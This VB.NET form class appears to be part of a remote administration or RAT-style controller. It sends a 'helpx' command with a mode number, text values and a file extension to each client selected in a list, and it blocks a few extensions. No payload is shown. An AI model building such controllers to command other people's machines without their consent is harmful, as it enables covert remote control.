Public Class Form24
    Public xxx As Integer
    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click

        If ComboBox2.Text = ".log" Or ComboBox2.Text = ".txt" Or ComboBox2.Text = ".wav" Or ComboBox2.Text = ".ini" Or ComboBox2.Text = ".LOG" Or ComboBox2.Text = ".TXT" Or ComboBox2.Text = ".WAV" Or ComboBox2.Text = ".INI" Then
            MsgBox("You can not use these formulas (.log,.txt,.wav,.ini", MsgBoxStyle.Critical)


        Else

        


            If Button1.Enabled = False Then
                For Each x As ListViewItem In Form1.L1.SelectedItems
                    Form1.S.Send(x.ToolTipText, "helpx" & "|U|" & ComboBox1.Text & "|U|" & TextBox1.Text & "|U|" & "1" & "|U|" & ComboBox2.Text)
                Next

            End If
            If Button2.Enabled = False Then


                For Each x As ListViewItem In Form1.L1.SelectedItems
                    Form1.S.Send(x.ToolTipText, "helpx" & "|U|" & ComboBox1.Text & "|U|" & TextBox1.Text & "|U|" & "2" & "|U|" & ComboBox2.Text)
                Next







            End If
            If Button3.Enabled = False Then



                For Each x As ListViewItem In Form1.L1.SelectedItems
                    Form1.S.Send(x.ToolTipText, "helpx" & "|U|" & ComboBox1.Text & "|U|" & TextBox1.Text & "|U|" & "3" & "|U|" & ComboBox2.Text)
                Next






            End If
            If Button4.Enabled = False Then



                For Each x As ListViewItem In Form1.L1.SelectedItems
                    Form1.S.Send(x.ToolTipText, "helpx" & "|U|" & ComboBox1.Text & "|U|" & TextBox1.Text & "|U|" & "4" & "|U|" & ComboBox2.Text)
                Next






            End If


        End If

    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Button1.Enabled = False
        Button2.Enabled = True
        Button3.Enabled = True
        Button4.Enabled = True
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Button1.Enabled = True
        Button2.Enabled = False
        Button3.Enabled = True
        Button4.Enabled = True
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Button1.Enabled = True
        Button2.Enabled = True
        Button3.Enabled = False
        Button4.Enabled = True
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Button1.Enabled = True
        Button2.Enabled = True
        Button3.Enabled = True
        Button4.Enabled = False
    End Sub

    Private Sub ComboBox2_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox2.SelectedIndexChanged
     
    End Sub

    Private Sub Form24_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
End Class